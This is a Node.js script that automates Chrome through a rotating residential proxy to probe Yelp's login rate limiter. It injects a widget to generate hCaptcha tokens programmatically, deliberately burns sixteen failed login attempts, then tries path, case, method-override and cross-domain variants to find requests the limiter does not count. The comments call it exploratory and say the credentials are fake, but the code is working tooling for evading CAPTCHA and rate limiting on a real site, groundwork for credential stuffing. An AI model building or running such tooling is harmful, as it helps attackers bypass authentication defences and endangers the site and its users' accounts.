// testpace/pace-hosts.js - exploratory only, never imported by the runner.
//
// Question: after one IP burns 15 POSTs on www.yelp.com, is the 429 bucket shared
// with other Yelp hosts/paths? (429 page is Varnish/edge generated, not Yelp JSON,
// so different Fastly service / CloudFront edge may have its own counter.)
//
// Phase 1: burn 16 POSTs on www.yelp.com/login/newajax -> limiter hot.
// Phase 2: same host, alt path/method variants.
// Phase 3: other Yelp hosts (their own login page, csrf, hcaptcha token).
//
// Every credential is fake. 200 = "incorrect password" = limiter did NOT reject it.
//
// env: PU_BASE PW [PU] [SESSID] [BID=8]

const http = require('http');
const net = require('net');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const BID = parseInt(process.env.BID || '8', 10);
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const SESS = process.env.SESSID || ('ph' + BID + Math.floor(Math.random() * 100000));
const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + '-sesstime-1800');
const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
const LP = 9090 + BID, CP = 9490 + BID;
const OUT = process.env.OUT || path.join(__dirname, 'hosts-' + SESS + '.jsonl');
const BURN_HOST = process.env.BURN_HOST || 'www.yelp.com';
const BURN_N = parseInt(process.env.BURN_N || '16', 10);
const TRIES = parseInt(process.env.TRIES || '3', 10);

const HOSTS = (process.env.HOSTS || 'www.yelp.ca,biz.yelp.com,www.yelp.co.uk,www.yelp.com.au').split(',');

fs.writeFileSync(OUT, '');
const sleep = ms => new Promise(r => setTimeout(r, ms));
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
process.on('uncaughtException', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });

const relay = http.createServer((q, s) => {
  s.on('error', () => {}); q.on('error', () => {});
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

(async () => {
  rec({ event: 'start', sess: SESS, hosts: HOSTS });
  await new Promise(r => relay.listen(LP, '127.0.0.1', r));
  const udd = path.join(os.tmpdir(), 'ph-' + Date.now());
  const cdd = path.join(os.tmpdir(), 'yelp-cache', 'probe');
  try { fs.mkdirSync(cdd, { recursive: true }); } catch (e) {}
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--window-size=900,700', '--lang=en-US',
    '--user-data-dir=' + udd,
    '--disable-background-timer-throttling', '--disable-renderer-backgrounding',
    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
    '--disk-cache-dir=' + cdd, '--disk-cache-size=67108864',
    '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2',
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'about:blank'
  ], { stdio: 'ignore' });

  let ver = null;
  for (let k = 0; k < 60 && !ver; k++) { await sleep(250); try { ver = await (await fetch('http://127.0.0.1:' + CP + '/json/version')).json(); } catch (e) {} }
  if (!ver) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  ws.addEventListener('error', () => {});
  let id = 0; const pend = new Map();
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    if (m.method === 'Fetch.requestPaused') {
      ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId }));
      return;
    }
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });

  let sid = null;
  for (let k = 0; k < 60 && !sid; k++) {
    await sleep(250);
    const t = await send('Target.getTargets');
    if (t && t.result) {
      const pg = t.result.targetInfos.find(x => x.type === 'page');
      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) sid = a.result.sessionId; }
    }
  }
  if (!sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }
  const sendS = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: sid })); });
  const ev = e => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: sid }));
    setTimeout(() => resolve(null), 20000);
  });

  await sendS('Page.enable'); await sendS('Network.enable', {});
  await sendS('Emulation.setFocusEmulationEnabled', { enabled: true });
  await sendS('Page.bringToFront', {});
  await sendS('Fetch.enable', { patterns: [
    { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
    { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }] });
  try { await sendS('Network.setBlockedURLs', { urls: require('../runner/bw-blocklist') }); } catch (e) {}

  async function hydrate(host) {
    for (let a = 0; a < TRIES; a++) {
      await sendS('Page.navigate', { url: 'https://' + host + '/login' });
      for (let k = 0; k < 15; k++) {
        await sleep(800);
        const s = await ev(`JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length,u:location.href})`);
        try { const o = JSON.parse(s); if (o && o.f && o.h) return o; } catch (e) {}
      }
    }
    return null;
  }
  const csrfOf = () => ev(`(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);
  async function arm() {
    return await ev(`(function(){
      if(!window.hcaptcha) return 'no-api';
      var c=document.querySelector('[data-hcaptcha-widget-id]');
      if(c && c.getAttribute('data-hcaptcha-widget-id')){ window.__wid=c.getAttribute('data-hcaptcha-widget-id'); return 'site:'+window.__wid; }
      var d=document.createElement('div'); d.id='__pcap'; d.style.display='none'; document.body.appendChild(d);
      window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__pacTok=t;}});
      return 'own:'+window.__wid;
    })()`);
  }
  const mint = () => ev(`new Promise(function(res){
    var w=window.__wid;
    if(!w){ res(''); return; }
    var done=false; function fin(t){ if(!done){ done=true; res(t||''); } }
    window.__pacTok='';
    try { window.hcaptcha.execute(w); } catch(e){ fin(''); return; }
    var n=0;
    var iv=setInterval(function(){
      n++;
      var t=window.__pacTok||'';
      if(!t){ try { t=window.hcaptcha.getResponse(w)||''; } catch(e){} }
      if(t){ clearInterval(iv); fin(t); }
      else if(n>60){ clearInterval(iv); fin(''); }
    },200);
  })`);

  // generic post on current page
  const postJS = (url, opts) => ev(`(async function(){
    try {
      var r=await fetch(${JSON.stringify(url)},${JSON.stringify(opts)});
      var txt=await r.text();
      return JSON.stringify({status:r.status, loc:r.headers.get('location')||'', ra:r.headers.get('retry-after')||'', body:txt.slice(0,90)});
    } catch(e){ return JSON.stringify({status:-1, body:'fetch:'+e.message}); }
  })()`);

  const form = (csrf, tok, extra) => {
    const b = new URLSearchParams();
    b.set('csrftok', csrf);
    b.set('email', extra.email);
    b.set('password', extra.pass);
    b.set('hcaptcha_response', tok);
    return b.toString();
  };
  const post = (url, csrf, tok, extra) => postJS(url, {
    method: 'POST', credentials: 'include',
    headers: Object.assign({ 'Content-Type': 'application/x-www-form-urlencoded' }, extra.hdr || {}),
    body: form(csrf, tok, extra)
  });

  async function hit(phase, host, url, csrf, extra) {
    const tok = await mint();
    if (!tok) { rec({ event: 'tokfail', phase, host }); return; }
    const raw = await post(url, csrf, tok, Object.assign({ email: 'hosts.' + phase + '.' + Math.floor(Math.random() * 1e6) + '@gmail.com', pass: 'WrongPass!7788' }, extra));
    let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
    rec({ phase, host, i: 0, status: r.status, ra: r.ra, loc: r.loc, tokLen: String(tok).length, body: r.body });
    return r;
  }

  // ---- phase 1: burn on BURN_HOST ----
  const st = await hydrate(BURN_HOST);
  if (!st) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }
  rec({ event: 'hydrated', host: BURN_HOST, url: st.u, len: st.l });
  let csrf = await csrfOf();
  const armed = await arm();
  rec({ event: 'widget', armed });
  if (String(armed).startsWith('err') || armed === 'no-api') { rec({ event: 'abort', why: 'widget' }); chrome.kill(); relay.close(); return; }

  for (let k = 0; k < BURN_N; k++) {
    const tok = await mint();
    if (!tok) { rec({ event: 'tokfail', phase: 'burn', k }); break; }
    const r = await post('/login/newajax', csrf, tok, { email: 'burn.' + k + '.' + Date.now() + '@gmail.com', pass: 'WrongPass!7788', hdr: { 'X-Requested-With': 'XMLHttpRequest' } });
    let o = {}; try { o = JSON.parse(r || '{}'); } catch (e) {}
    rec({ phase: 'burn', host: BURN_HOST, k: k + 1, status: o.status, body: (o.body || '').slice(0, 40) });
  }

  // ---- phase 2: path/method variants on hot www ----
  if (BURN_HOST === 'www.yelp.com') {
  csrf = await csrfOf();
  await hit('classic', 'www.yelp.com', '/login', csrf, { hdr: {} });
  await hit('control', 'www.yelp.com', '/login/newajax', csrf, { hdr: { 'X-Requested-With': 'XMLHttpRequest' } });
  await hit('jsonpath', 'www.yelp.com', '/login/newajax.json', csrf, { hdr: { 'X-Requested-With': 'XMLHttpRequest' } });
  await hit('override', 'www.yelp.com', '/login/newajax', csrf, { hdr: { 'X-Requested-With': 'XMLHttpRequest', 'X-HTTP-Method-Override': 'GET' } });
  await hit('upper', 'www.yelp.com', '/LOGIN/newajax', csrf, { hdr: { 'X-Requested-With': 'XMLHttpRequest' } });
  // GET with query args
  {
    const tok = await mint();
    if (tok) {
      const q = new URLSearchParams({ csrftok: csrf, email: 'get.probe@gmail.com', password: 'WrongPass!7788', hcaptcha_response: tok });
      const r = await postJS('/login/newajax?' + q.toString(), { method: 'GET', credentials: 'include', headers: { 'X-Requested-With': 'XMLHttpRequest' } });
      let o = {}; try { o = JSON.parse(r || '{}'); } catch (e) {}
      rec({ phase: 'get', host: 'www.yelp.com', status: o.status, tokLen: String(tok).length, body: (o.body || '').slice(0, 60) });
    }
  }
  }

  // ---- phase 3: other hosts, limiter hot ----
  for (const h of HOSTS) {
    const s2 = await hydrate(h);
    if (!s2) { rec({ area: 'host', host: h, event: 'no-login-page' }); continue; }
    let landed = ''; try { landed = new URL(s2.u).host; } catch (e) {}
    const c2 = await csrfOf();
    const a2 = await arm();
    rec({ area: 'host', host: h, landed, csrfLen: (c2 || '').length, armed: a2 });
    if (!c2 || landed !== h || String(a2).startsWith('err') || a2 === 'no-api') continue;
    await hit('host', h, 'https://' + h + '/login/newajax', c2, { hdr: { 'X-Requested-With': 'XMLHttpRequest' } });
  }

  // control on burn host again
  await hydrate(BURN_HOST);
  await hit('control2', BURN_HOST, '/login/newajax', await csrfOf(), { hdr: { 'X-Requested-With': 'XMLHttpRequest' } });

  rec({ event: 'summary', sess: SESS });
  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 500);
})();
